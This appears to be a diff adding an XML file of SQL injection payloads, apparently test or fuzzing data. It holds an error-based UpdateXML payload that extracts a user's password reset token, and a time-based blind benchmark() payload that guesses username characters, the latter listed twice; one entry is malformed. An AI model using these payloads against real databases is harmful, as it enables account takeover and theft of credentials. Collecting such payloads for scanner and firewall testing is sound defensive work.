@@ -1,0 +1,18 @@
+<root>
+	<element>
+		<id>0</id>
+		<payload>and UpdateXML(1,CONCAT(0x5b,mid((SELECT passw ord_reset_token from gpk_main.users where id=1),1,32),0x5d),1)</payload>
+	</element>
+	<element>
+		<id>1</id>
+		<payload>union select 1,benchmark(500000,md5('test')),1 from user where userid=1  and  ord(substring(username,1,1))=97 /*</payload>
+	</element>
+	<element>
+		<id>2</id>
+		<payload>and  (select count(*) from *)</payload>
+	</element>
+	<element>
+		<id>3</id>
+		<payload>union select 1,benchmark(500000,md5('test')),1 from user where userid=1  and  ord(substring(username,1,1))=97 /*</payload>
+	</element>
+</root>
